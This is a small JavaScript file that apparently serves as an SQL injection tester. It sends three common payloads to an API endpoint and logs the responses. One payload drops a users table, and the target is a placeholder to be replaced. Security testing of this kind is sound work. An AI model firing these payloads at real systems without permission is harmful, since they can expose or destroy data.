const axios = require("axios");

// Common SQL Injection payloads
const sqlPayloads = ["' OR '1'='1", "'; DROP TABLE users;", "' UNION SELECT null, null--"];

// Function to test API endpoint for SQL injection vulnerability
const testSQLInjection = async (url, method = "GET", headers = {}, body = {}) => {
    const results = [];

    for (const payload of sqlPayloads) {
        try {
            const response = await axios({
                method,
                url,
                headers,
                data: { ...body, injected_param: payload }, // Injecting test payloads
                timeout: 5000,
            });

            results.push({ payload, status: response.status, data: response.data });
        } catch (error) {
            results.push({ payload, error: error.response ? error.response.status : "Unknown Error" });
        }
    }

    return results;
};

// Example Usage
const apiUrl = "https://example.com/api"; // Replace with target API
testSQLInjection(apiUrl).then((res) => console.log("SQL Injection Test Results:", res));

module.exports = { testSQLInjection };